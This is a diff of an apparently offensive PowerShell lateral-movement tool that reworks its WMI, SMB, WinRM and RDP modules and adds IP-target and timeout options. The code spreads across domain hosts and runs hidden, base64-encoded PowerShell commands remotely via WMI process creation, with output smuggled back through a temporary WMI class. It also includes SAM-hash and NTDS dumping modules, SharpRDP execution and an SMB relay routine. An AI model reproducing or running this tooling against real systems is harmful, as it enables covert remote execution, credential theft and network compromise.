-$LocalUsername = "$ComputerName\$UserName"
-$LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential($LocalUsername,$LocalPassword)
-$osInfo = $null
-
-if ($Command -eq ""){
-$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue" -Credential $cred
-    if (!$osInfo){return "Access Denied"} elseif ($osInfo){return "Successful Connection PME"}
-}
-
-
-#Check access
-$ErrorActionPreference = "silentlycontinue"
-$osInfo = $null  # Reset $osInfo variable before each iteration
-
-# OSinfo
-$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -Credential $Cred
-
-# If OSinfo true and command empty
-if ($osinfo -and $Command -eq ""){
-$result =  "Reminder to move this outside of runspace"
-return $result
-
-}
-
-# If OSinfo true and command not empty
-elseif ($osinfo -and $Command -ne ""){
-
-if ($LocalAuth){	
-	function CreateScriptInstance([string]$ComputerName, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
-    $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred
-    
-    if (!$classCheck) {Write-Host "ClassCheck"
-$Code = "CgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACIAXABcACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQBcAHIAbwBvAHQAXABjAGkAbQB2ADIAIgAsAFsAcw
-B0AHIAaQBuAGcAXQA6ADoARQBtAHAAdAB5ACwAJABuAHUAbABsACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAFsAIgBfAF8AQwBMAEEAUwBTACIAXQAgAD0AIAAiAFAATQBFAEMAbABhAHMAcwAiAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFEAdQBhAGwAaQBmAGkAZQByAHMALgBBAGQAZAAoACIAUwB0AGEAdABpAGMAIgAs
-ACQAdAByAHUAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMALgBBAGQAZAAoACIAQwBvAG0AbQBhAG4AZABJAGQAIgAsAFsAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQwBpAG0AVAB5AHAAZQBdADoAOgBTAHQAcgBpAG4AZwAsACQAZgBhAGwAcwBlACkACgAgACAAIAAgAC
-QAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACIAQwBvAG0AbQBhAG4AZABJAGQAIgBdAC4AUQB1AGEAbABpAGYAaQBlAHIAcwAuAEEAZABkACgAIgBLAGUAeQAiACwAJAB0AHIAdQBlACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwAuAEEAZABkACgAIgBDAG8AbQBtAGEA
-bgBkAE8AdQB0AHAAdQB0ACIALABbAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEMAaQBtAFQAeQBwAGUAXQA6ADoAUwB0AHIAaQBuAGcALAAkAGYAYQBsAHMAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAdQB0ACgAKQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgA="
-
-
-$CommandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $Code"
-    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred
-
-
-
-# Required, if we proceed to quickly the class will not register and cause a break. Should probably loop this so we can move on as soon as the class is created
-Start-Sleep -Seconds "10"
-    
+    # Create PSCredential object if using local authentication
+    if ($LocalAuth) {
+        $LocalUsername = "$ComputerName\$Username"
+        $LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
+        $cred = New-Object System.Management.Automation.PSCredential($LocalUsername, $LocalPassword)
     }
-    elseif ($classCheck -ne $null){
-        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred
 
-    
-    $wmiInstance.GetType() | Out-Null
-    $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
-    $wmiInstance.Dispose()
-    return $CommandId
-    }
-}
+    # Check for local or non-local authentication
+    if ($LocalAuth) {$WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" -Credential $Cred } 
+    else {$WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" }
 
-$Commandid = CreateScriptInstance $ComputerName $cred $Class $LocalAuth
+    if (!$WMIAccess) { return "Access Denied"} 
+    elseif ($Command -eq "") { return "Successful Connection PME" }
 
+    function CreateScriptInstance {
+        param ([string]$ComputerName)
 
-function GetScriptOutput([string]$ComputerName, [string]$CommandId, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
-    try {
-            $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'" -Credential $cred 
-        
-        $result = $wmiInstance.CommandOutput
-        $wmiInstance.Dispose()
-        return $result
-    } 
-    catch {
-        Write-Host "Failed"
-        #Write-Error $_.Exception.Message
-    } 
-    finally {
-        if ($wmiInstance) {
+        if ($LocalAuth) {
+            if ($LocalAuth) {
+                $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $Cred
+                if ($classCheck -eq $null) {
+                    $scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", (New-Object System.Management.ConnectionOptions -Property @{ Username = "$Computername\$Username"; Password = $Password }))
+                    $scope.Connect()
+
+                    $newClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::DefaultPath, $null)
+                    $newClass["__CLASS"] = "$Class"
+                    $newClass.Qualifiers.Add("Static", $true)
+                    $newClass.Properties.Add("CommandId", [System.Management.CimType]::String, $false)
+                    $newClass.Properties["CommandId"].Qualifiers.Add("Key", $true)
+                    $newClass.Properties.Add("CommandOutput", [System.Management.CimType]::String, $false)
+                    $newClass.Put() | Out-Null
+                }
+
+                $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $Cred
+                $wmiInstance.GetType() | Out-Null
+                $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
+                $wmiInstance.Dispose()
+                return $commandId
+            }
+        } else {
+            $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
+            if ($classCheck -eq $null) {
+                $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null)
+                $newClass["__CLASS"] = "$Class"
+                $newClass.Qualifiers.Add("Static", $true)
+                $newClass.Properties.Add("CommandId", [System.Management.CimType]::String, $false)
+                $newClass.Properties["CommandId"].Qualifiers.Add("Key", $true)
+                $newClass.Properties.Add("CommandOutput", [System.Management.CimType]::String, $false)
+                $newClass.Put() | Out-Null
+            }
+            $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
+            $wmiInstance.GetType() | Out-Null
+            $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
             $wmiInstance.Dispose()
+            return $commandId
         }
     }
-}
 
-function ExecCommand([string]$ComputerName, [string]$Command, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
-    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
-    
-    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred
- 
-    if ($process.ReturnValue -eq 0) {
-        $started = Get-Date
-        Do {
-            if ($started.AddMinutes(2) -lt (Get-Date)) {
-                Write-Host "PID: $($process.ProcessId) - Response took too long."
-                break
+    # Function to retrieve script output
+    function GetScriptOutput {
+        param (
+            [string]$ComputerName,
+            [string]$CommandId
+        )
+        try {
+            if ($LocalAuth) {
+                $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'" -Credential $Cred
+            } else {
+                $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
             }
-    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $cred
-            
-            Start-Sleep -Seconds 1
-        } While ($watcher -ne $null)
-        $scriptOutput = GetScriptOutput $ComputerName $ScriptCommandID $cred $Class $LocalAuth
-        return $scriptOutput
-    }
-}
-
-$commandString = $Command
-$scriptCommandId = CreateScriptInstance $ComputerName $cred $Class $LocalAuth
-if ($scriptCommandId -eq $null) {
-    Write-Host "Script Command ID Failed" -ForegroundColor "Red"
-}
-$encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
-$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
-$result = ExecCommand $ComputerName $encodedCommand $Cred $Class $LocalAuth
-$wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"  -Credential $cred
-Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName  -Credential $cred
-return $result
-}
-
-
-
-}
-
-elseif (!$osinfo){
-    if ($SuccessOnly){return} 
-        elseif (!$SuccessOnly) {
-
-               return "Access Denied"
+            $result = $wmiInstance.CommandOutput
+            $wmiInstance.Dispose()
+            return $result
+        } catch {
+            Write-Error $_.Exception.Message
+        } finally {
+            if ($wmiInstance) {
+                $wmiInstance.Dispose()
             }
         }
-}
-    if ($LocalAuth) {return LocalWMI -Username $Username -Password $Password -ComputerName $computerName -Command $Command}
-    
-    Function WMI {
-
-param (
-  [string]$Command = "",
-  [string]$ComputerName,
-  [string]$Class = "PMEClass"
-)
-
-if ($Command -eq ""){
-$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue"
-    if (!$osInfo){return "Access Denied"} elseif ($osInfo){return "Successful Connection PME"}
-}
-
-if ($Command -ne ""){
-$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue"
-    if (!$osInfo){return "Access Denied"}
-}
-
-function CreateScriptInstance([string]$ComputerName) {
-        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
-        if ($classCheck -eq $null) {
-            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
-            $newClass["__CLASS"] = "$Class"
-            $newClass.Qualifiers.Add("Static",$true)
-            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
-            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
-            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
-            $newClass.Put() | Out-Null
-        }
-        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
-        $wmiInstance.GetType() | Out-Null
-        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
-        $wmiInstance.Dispose()
-        return $CommandId
-        
     }
 
-function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
-    try {
-        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
-        $result = $wmiInstance.CommandOutput
-        $wmiInstance.Dispose()
-        return $result
-    } 
-    catch {Write-Error $_.Exception.Message} 
-    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
-}
-
-
-    function ExecCommand([string]$ComputerName, [string]$Command) {
+    # Function to execute a command remotely
+    function ExecCommand {
+        param (
+            [string]$ComputerName,
+            [string]$Command
+        )
         $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
-        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
+        if ($LocalAuth) {
+            $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $Cred
+        } else {
+            $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
+        }
         if ($process.ReturnValue -eq 0) {
             $started = Get-Date
             Do {
@@ -1440,76 +1565,63 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
                     Write-Host "PID: $($process.ProcessId) - Response took too long."
                     break
                 }
-                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
+                if ($LocalAuth) {
+                    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $Cred
+                } else {
+                    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
+                }
                 Start-Sleep -Seconds 1
             } While ($watcher -ne $null)
-            $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
+            $scriptOutput = GetScriptOutput -ComputerName $ComputerName -CommandId $scriptCommandId
             return $scriptOutput
         }
     }
 
+    # Main script logic
     $commandString = $Command
-    $scriptCommandId = CreateScriptInstance $ComputerName
+    $scriptCommandId = CreateScriptInstance -ComputerName $ComputerName
     if ($scriptCommandId -eq $null) {
         Write-Error "Error creating remote instance."
     }
     $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
     $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
-    $result = ExecCommand $ComputerName $encodedCommand
-    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
-    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
+    $result = ExecCommand -ComputerName $ComputerName -Command $encodedCommand
+
+    # Clean up WMI class instance
+    if ($LocalAuth) {
+        $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2" -Credential $Cred
+        Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -Credential $Cred | Out-Null
+    } else {
+        $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
+        Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
+    }
+
     return $result
-
-    
-
-}
-    if (!$LocalAuth) {return WMI -ComputerName $computerName -Command $Command}
-
 }
 
-function Display-ComputerStatus {
-    param (
-        [string]$ComputerName,
-        [string]$OS,
-        [System.ConsoleColor]$statusColor = 'White',
-        [string]$statusSymbol = "",
-        [string]$statusText = "",
-        [int]$NameLength,
-        [int]$OSLength
-    )
+If ($LocalAuth){WMI -ComputerName $ComputerName -Command $Command -LocalAuth -Username $Username -Password $Password}
+else {WMI -ComputerName $ComputerName  -Command $Command}
 
-    # Prefix
-    Write-Host "WMI " -ForegroundColor Yellow -NoNewline
-    Write-Host "   " -NoNewline
-    
-    # Resolve IP
-    $IP = $null
-    $Ping = New-Object System.Net.NetworkInformation.Ping 
-    $Result = $Ping.Send($ComputerName, 15)
-    if ($Result.Status -eq 'Success') {
-    $IP = $Result.Address.IPAddressToString
-    Write-Host ("{0,-16}" -f $IP) -NoNewline
-    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
-    
-    # Display ComputerName and OS
-    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-    Write-Host "   " -NoNewline
-    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-    Write-Host "   " -NoNewline
 
-    # Display status symbol and text
-    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
-    Write-Host $statusText
 }
 
 # Create and invoke runspaces for each computer
 # Filter non-candidate systems before wasting processing power on creating runspaces
+
 foreach ($computer in $computers) {
+
+    if (!$IPAddress){
     $ComputerName = $computer.Properties["dnshostname"][0]
     $OS = $computer.Properties["operatingSystem"][0]
+    }
+
+    elseif ($IPAddress){
+    $ComputerName = "$Computer"
+    $OS = "OS:PLACEHOLDER"
+    }
 
 
-        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth)
+        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Timeout)
         $runspace.RunspacePool = $runspacePool
 
         [void]$runspaces.Add([PSCustomObject]@{
@@ -1627,7 +1739,11 @@ $runspacePool.Dispose()
 ################################################################################################################
 ############################################## Function: SMB ################################################
 ################################################################################################################
+
+
+
 Function Method-SMB{
+
 Write-host
 
 $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
@@ -1635,11 +1751,11 @@ $runspacePool.Open()
 $runspaces = New-Object System.Collections.ArrayList
 
 $scriptBlock = {
-    param($ComputerName, $Command)
+    param($ComputerName, $Command, $Timeout)
     
 $tcpClient = New-Object System.Net.Sockets.TcpClient
 $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
-$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 
+$wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 
 
 if ($wait) { 
     try {
@@ -1665,8 +1781,6 @@ if (!$SMBCheck) {
 if ([string]::IsNullOrWhiteSpace($Command)) {
     return "Successful connection PME"
 }
-
-
 
 
     
@@ -1818,48 +1932,23 @@ while (`$true) {
 }
 
 
-function Display-ComputerStatus {
-    param (
-        [string]$ComputerName,
-        [string]$OS,
-        [System.ConsoleColor]$statusColor = 'White',
-        [string]$statusSymbol = "",
-        [string]$statusText = "",
-        [int]$NameLength,
-        [int]$OSLength
-    )
 
-    # Prefix
-    Write-Host "SMB " -ForegroundColor Yellow -NoNewline
-    Write-Host "   " -NoNewline
-    
-    # Resolve IP
-    $IP = $null
-    $Ping = New-Object System.Net.NetworkInformation.Ping 
-    $Result = $Ping.Send($ComputerName, 15)
-    if ($Result.Status -eq 'Success') {
-    $IP = $Result.Address.IPAddressToString
-    Write-Host ("{0,-16}" -f $IP) -NoNewline
-    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
-    
-    # Display ComputerName and OS
-    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-    Write-Host "   " -NoNewline
-    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-    Write-Host "   " -NoNewline
 
-    # Display status symbol and text
-    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
-    Write-Host $statusText
-}
 
 # Create and invoke runspaces for each computer
 foreach ($computer in $computers) {
 
+    if (!$IPAddress){
     $ComputerName = $computer.Properties["dnshostname"][0]
     $OS = $computer.Properties["operatingSystem"][0]
+    }
 
-    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
+    elseif ($IPAddress){
+    $ComputerName = "$Computer"
+    $OS = "OS:PLACEHOLDER"
+    }
+
+    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
     $runspace.RunspacePool = $runspacePool
 
     [void]$runspaces.Add([PSCustomObject]@{
@@ -1885,29 +1974,29 @@ do {
             # [other conditions for $result]
             if ($result -eq "Access Denied") {
                 if ($successOnly) { continue }
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!" -methodPrefix "SMB!"
                 continue
             } 
             elseif ($result -eq "Unexpected Error") {
                 if ($successOnly) { continue }
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
                 continue
             } 
             
             elseif ($result -eq "Timed Out") {
                 if ($successOnly) { continue }
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
                 continue
             }
             
             elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                 if ($successOnly) { continue }
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
                 continue
             } 
              
             elseif ($result -eq "Successful Connection PME") {
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
             } 
             
             elseif ($result -eq "Unable to connect") {}
@@ -1916,11 +2005,11 @@ do {
                 
                 if ($result -eq "No Results") {
                     if ($successOnly) { continue }
-                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
                 }
                  
                 else {
-                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
 
                     $filePath = switch ($Module) {
                         "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
@@ -1988,11 +2077,11 @@ $runspacePool.Open()
 $runspaces = New-Object System.Collections.ArrayList
 
 $scriptBlock = {
-    param ($computerName, $Command)
+    param ($computerName, $Command, $Timeout)
     
 $tcpClient = New-Object System.Net.Sockets.TcpClient
 $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
-$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 
+$wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 
 
 if ($wait) { 
     try {
@@ -2023,51 +2112,13 @@ if (!$connected) {return "Unable to connect" }
     }
 }
 
-
-
-function Display-ComputerStatus {
-    param (
-        [string]$ComputerName,
-        [string]$OS,
-        [System.ConsoleColor]$statusColor = 'White',
-        [string]$statusSymbol = "",
-        [string]$statusText = "",
-        [int]$NameLength,
-        [int]$OSLength
-    )
-
-    # Prefix
-    Write-Host "WinRM " -ForegroundColor Yellow -NoNewline
-    Write-Host "   " -NoNewline
-    
-    # Resolve IP
-    $IP = $null
-    $Ping = New-Object System.Net.NetworkInformation.Ping 
-    $Result = $Ping.Send($ComputerName, 15)
-    if ($Result.Status -eq 'Success') {
-    $IP = $Result.Address.IPAddressToString
-    Write-Host ("{0,-16}" -f $IP) -NoNewline
-    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
-    
-    # Display ComputerName and OS
-    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-    Write-Host "   " -NoNewline
-    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-    Write-Host "   " -NoNewline
-
-    # Display status symbol and text
-    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
-    Write-Host $statusText
-}
-
-
 # Create and invoke runspaces for each computer
 foreach ($computer in $computers) {
 
     $ComputerName = $computer.Properties["dnshostname"][0]
     $OS = $computer.Properties["operatingSystem"][0]
     
-    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
+    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
     $runspace.RunspacePool = $runspacePool
 
     [void]$runspaces.Add([PSCustomObject]@{
@@ -2200,11 +2251,11 @@ $runspacePool.Open()
 $runspaces = New-Object System.Collections.ArrayList
 
 $RunSpaceScriptBlock = {
-    param ($computerName)
+    param ($computerName, $Timeout)
     
     $tcpClient = New-Object System.Net.Sockets.TcpClient
     $asyncResult = $tcpClient.BeginConnect($ComputerName, 3389, $null, $null)
-    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 
+    $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 
 
     if ($wait) { 
         try {
@@ -2223,10 +2274,18 @@ $RunSpaceScriptBlock = {
 }
 
 foreach ($computer in $computers) {
+    
+    if (!$IPAddress){
     $ComputerName = $computer.Properties["dnshostname"][0]
     $OS = $computer.Properties["operatingSystem"][0]
+    }
+
+    elseif ($IPAddress){
+    $ComputerName = $Computer
+    $OS = "BLANK"
+    }
     
-    $runspace = [powershell]::Create().AddScript($RunSpaceScriptBlock).AddArgument($ComputerName)
+    $runspace = [powershell]::Create().AddScript($RunSpaceScriptBlock).AddArgument($ComputerName).AddArgument($Timeout)
     $runspace.RunspacePool = $runspacePool
 
     [void]$runspaces.Add([PSCustomObject]@{
@@ -2267,8 +2326,17 @@ $runspacePool.Dispose()
 
 
 foreach ($Computer in $Computers) {
-$OS = $computer.Properties["operatingSystem"][0]
-$ComputerName = $computer.Properties["dnshostname"][0]
+    
+    if (!$IPAddress){
+    $ComputerName = $computer.Properties["dnshostname"][0]
+    $OS = $computer.Properties["operatingSystem"][0]
+    }
+
+    elseif ($IPAddress){
+    $ComputerName = "$Computer"
+    $OS = "OS:PLACEHOLDER"
+    }
+
     # Check if the computer is in the FailedComputers list
     if ($ComputerName -in $FailedComputers) {continue}
 
@@ -2335,6 +2403,7 @@ function Display-ComputerStatus {
     Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
     Write-Host $statusText
 }
+
 
 if ($LocalAuth){$Domain = $ComputerName}
 if ($Password -ne ""){$result = Invoke-SharpRDP -Command "username=$Domain\$Username password=$Password computername=$ComputerName command='hostname'"}
@@ -3250,7 +3319,7 @@ Param (
     }
     foreach ($Target in $Targets) {
         $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
-        $SMB_relay_socket.Client.ReceiveTimeout = 3000
+        $SMB_relay_socket.Client.ReceiveTimeout = $Timeout
         $SMB_relay_socket.Connect($Target,"445")
         $HTTP_client_close = $false
         if(!$SMB_relay_socket.connected)
@@ -3271,41 +3340,6 @@ Param (
 
 }
 
-function Display-ComputerStatus {
-    param (
-        [string]$ComputerName,
-        [string]$OS,
-        [System.ConsoleColor]$statusColor = 'White',
-        [string]$statusSymbol = "",
-        [string]$statusText = "",
-        [int]$NameLength,
-        [int]$OSLength
-    )
-
-    # Prefix
-    Write-Host "SMB " -ForegroundColor Yellow -NoNewline
-    Write-Host "   " -NoNewline
-    
-    # Resolve IP
-    $IP = $null
-    $Ping = New-Object System.Net.NetworkInformation.Ping 
-    $Result = $Ping.Send($ComputerName, 15)
-    if ($Result.Status -eq 'Success') {
-    $IP = $Result.Address.IPAddressToString
-    Write-Host ("{0,-16}" -f $IP) -NoNewline
-    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
-    
-    # Display ComputerName and OS
-    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-    Write-Host "   " -NoNewline
-    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-    Write-Host "   " -NoNewline
-
-    # Display status symbol and text
-    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
-    Write-Host $statusText
-}
-
 Function GenRelayList {
     
     Write-Host
@@ -3313,12 +3347,20 @@ Function GenRelayList {
     Get-SMBSigning
     
     foreach ($Computer in $Computers) {
-    $OS = $computer.Properties["operatingSystem"][0]
+    
+    if (!$IPAddress){
